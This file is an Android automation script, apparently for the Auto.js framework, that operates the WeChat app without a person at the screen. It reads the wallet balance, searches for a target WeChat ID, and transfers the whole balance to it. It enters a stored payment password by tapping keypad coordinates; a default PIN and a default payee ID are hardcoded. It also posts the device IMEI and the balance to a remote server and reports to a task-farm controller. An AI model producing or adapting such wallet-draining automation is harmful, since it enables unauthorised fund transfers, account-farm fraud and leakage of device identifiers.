// 保持脚本运行
var ID = setInterval(() => { }, 1000)
// 监听主脚本消息
events.on("prepare", function (i,task_info, mainEngine) {
    log("task_info",task_info);
    log("id=>",task_info.id)
    
    var task_data = JSON.parse(task_info.task_data);
    my_app.pay_id = task_data.userid
    var deviceinfo = JSON.parse(task_info.task_info);
    my_app.pay_pwd = deviceinfo.wechat_pwd

    info["model"]= my_app.name;
    info["state"] = "fail";
    if(main()) info["state"] = "ok"
    app_info(my_app.name,info);
    home();
    callback_task(task_info.id,"done");
    log(info);

    mainEngine.emit("control", i,task_info);  //向主脚本发送一个事件，该事件可以在它的events模块监听到并在脚本主线程执行事件处理。
    clearInterval(ID);   //取消一个由 setInterval() 创建的循环定时任务。
});




log(currentActivity())
log(currentPackage())

var my_app = {};
my_app.name = "微信";
my_app.Package = "com.tencent.mm";
my_app.pay_pwd = "147258";
my_app.pay_id = "kevin_wu99";
my_app.pay_nickname = "";
var info = {}
var width = 720;
var height = 1440;

function get_data() {
    try {
        log("----canshu"+db.taskParam());
        return JSON.parse(db.taskParam());
    } catch (error) {
        log("异常" + error);
    }
}

var data = get_data();
if(data){
    my_app.pay_id = data.pay_id;
    my_app.pay_pwd = data.pay_pwd;
}

// var d = textMatches(/.*/).find();
// if (d){
//     for (var i=0;i<d.length;i++){
//         log(d[i].text(),d[i].id())
//     }
// }else{
//     log("nothing")
// }


// info["state"] = "fail";
// if (main()) info["state"] = "ok";
// app_info("微信转帐",info);
// sendBroadcast(my_app.name, JSON.stringify(info));

function main(){
    if (read_money()) return pay();
}

function read_money(){

    while (true) {
        log("read_money")
        if ( active(my_app.Package) ){
            var UI = currentActivity();
            log('UI',UI)
            switch(UI){
                case "com.tencent.mm.ui.LauncherUI":
                    log("微信主界面");
                    click(630,1318);
                    if( jsclick("text","我",true,2)){
                        jsclick("text","支付",true,2)
                    }else if(jsclick("text","通讯录",true,2)){
                    }else if(jsclick("text","微信",true,2)){
                    }else{
                        back();
                        sleep(1000);
                        back();
                        sleep(1000);
                        home();
                    }
                    break;
                case "com.tencent.mm.plugin.mall.ui.MallIndexUI":
                    log("钱包页面");
                    if (jsclick("text","上传身份证照片",false,2)){
                        back();
                    }else{
                        var d = textMatches("/¥.*/").findOne(100);
                        if(d){
                            d = d.text().replace("¥","");
                            info["money"] = d;
                            log(info);
                            sleep(1000);
                            back();
                            sleep(2000);
                            return true
                        }
                    }
                    break;
                default :
                    back();
                    sleep(2000);
            }
        }
        sleep(1000*2);
    }
}


function pay(){
    var pay_times = 0
    var pay_pwd_times = 0
    while (pay_times < 60) {
        if ( active(my_app.Package) ){
            var UI = currentActivity();
            log('UI',UI);
            switch(UI){
                case "com.tencent.mm.ui.LauncherUI":
                    log("微信主界面");
                    if(jsclick("id","c2",true,2)){
                        setText(0,my_app.pay_id);
                    }else if(jsclick("text","通讯录",true,2)){
                    }else if(jsclick("text","微信",true,2)){
                    }else{
                        back();
                        sleep(1000);
                        home();
                    }
                    break;
                case "com.tencent.mm.plugin.fts.ui.FTSMainUI":
                    log("搜索结果界面");
                    var trueid = "微信号: "+my_app.pay_id;
                    var d = text(trueid).findOne(1000);
                    if(d){
                        var dd = d.parent();
                        var ddd = dd.children();
                        // ddd.forEach(function (child, index) {
                        //     log(index, child.text(),child.id());
                        // });
                        var dddd = ddd[0].children();
                        log(dddd[0].text());
                        my_app.pay_nickname = dddd[0].text();
                        click__(d);
                    }else{
                        back();
                    }
                    break;
                case "com.tencent.mm.ui.chatting.ChattingUI":
                    log("聊天界面");
                    if (jsclick("text",my_app.pay_nickname,false,0)){
                        if(jsclick("text","转账",true,2)){
                        }else if(jsclick("desc","更多功能按钮，已折叠",true,2)){
                        }
                    }else{
                        log("不是目标聊天界面");
                        back();
                    }
                    break;
                case "com.tencent.mm.plugin.remittance.ui.RemittanceUI":
                    log("转帐界面");
                    if(info["money"]){
                        setText(0,info["money"]);
                        sleep(1000);
                        var d = className("TextView").find();
                        if(d){
                            if (d.length< 8){
                                back();
                                break;
                            }
                            for (var i=0;i<d.length;i++){
                                var dd = d[i]
                                log(dd.text())
                                if (dd.text() == "转账"){
                                    click__(dd);
                                    sleep(2000);
                                    log("点击转帐")
                                }
                            }
                        }
                    }else{
                        back();
                    }
                    sleep(1000);
                    break;
                case "com.tencent.mm.plugin.wallet.pay.ui.WalletPayUI":
                    log("输密码界面");
                    if (jsclick("text","支付方式",false)){
                        input_pay_password(my_app.pay_pwd);
                    }else{
                        pay_pwd_times++
                        if(pay_pwd_times > 3){
                            input_pay_password(my_app.pay_pwd);
                        }
                    }
                    break;
                case "com.tencent.mm.plugin.remittance.ui.RemittanceResultNewUI":
                    if (jsclick("text","完成",true,5)){
                        return true
                    }
                    break;
                case "com.tencent.mm.plugin.mall.ui.MallIndexUI":
                    log("钱包页面");
                    if (jsclick("text","上传身份证照片",false,2)){
                        back();
                    }else{
                        var d = textMatches("/￥.*/").findOne(1000);
                        if(d){
                            d = d.replace("￥","");
                            info["money"] = d;
                        }
                        sleep(1000);
                        back();
                    }
                    break;
                default:
                    back();
                    sleep(2000);
                    home();
                    sleep(2000);
            }
        }
        sleep(1000*2);
        pay_times++
    }
}
//
function jspost(url,data){
    var res = http.post(url, data);
    var data = res.body.string();
    if(data){
        return data;
    }
}

function app_info(name,data){
    var url = "http://news.wenfree.cn/phalapi/public/";
    var postdata = {};
    postdata["s"]="App.ZllgcAppInfo.App_info";
    postdata["imei"]= device.getIMEI();
    postdata["app_name"]= name;
    postdata["whos"]= "ouwen000";
    postdata["app_info"]= JSON.stringify(data);
    log(jspost(url,postdata));
}






//基础函数
function active(pkg,n){
    if(!n){n=5}
    if(  currentPackage() == pkg ){
       log("应用在前端");
       return true;
    }else{
        app.launch(pkg);
        sleep(1000*n);
    }
}

//准备点击
function click_(x,y){
    if(x>0 && x < width && y > 0 && y < height){
        click(x,y)
    }else{
        log('坐标错误')
    }
}

//点击obj
function click__(obj){
    click_(obj.bounds().centerX(),obj.bounds().centerY())
}

//普通封装
function jsclick(way,txt,clickKey,n){
    if(!n){n=1};//当n没有传值时,设置n=1
    var res = false;
    if(!clickKey){clickKey=false}; //如果没有设置点击项,设置为false
    if (way == "text"){
        res = text(txt).findOne(200);
    }else if(way == "id"){
        res = id(txt).findOne(200);
    }else if(way == "desc"){
        res = desc(txt).findOne(200);
    }
    if(res){
        if ( clickKey ){
            log('准备点击->',txt,"x:",res.bounds().centerX(),"y:",res.bounds().centerY());
            click_(res.bounds().centerX(),res.bounds().centerY());
        }else{
            log("找到->",txt);
        }
        sleep(1000*n);
        return true;
    }else{
        // log("没有找到->",txt)
    }
}

//输入密码
function input_pay_password(password){
    var key_xy = {}
    key_xy[1]=[device.width*0.3,device.height*7/10]
    key_xy[2]=[device.width*0.5,device.height*7/10]
    key_xy[3]=[device.width*0.8,device.height*7/10]
    key_xy[4]=[device.width*0.3,device.height*7.5/10]
    key_xy[5]=[device.width*0.5,device.height*7.5/10]
    key_xy[6]=[device.width*0.8,device.height*7.5/10]
    key_xy[7]=[device.width*0.3,device.height*8/10]
    key_xy[8]=[device.width*0.5,device.height*8/10]
    key_xy[9]=[device.width*0.8,device.height*8/10]
    key_xy[0]=[device.width*0.5,device.height*9/10]
    // 清除其它字符
    password = password.replace(/\D/g,"")
    for(var i=0;i<password.length;i++){
        var numbers = password.substring(i,i+1);
        click_(key_xy[numbers][0],key_xy[numbers][1])
        sleep(300)
    }
}


function sendBroadcast(appName, data) {
    sleep(2000)
    var mapObject = {
        appName: appName,
        data: data
    }
    app.sendBroadcast(
        {
            packageName: "com.flow.factory",
            className: "com.flow.factory.trafficfactory.broadcast.TaskBroadCast",
            extras: mapObject
        }
    );
}
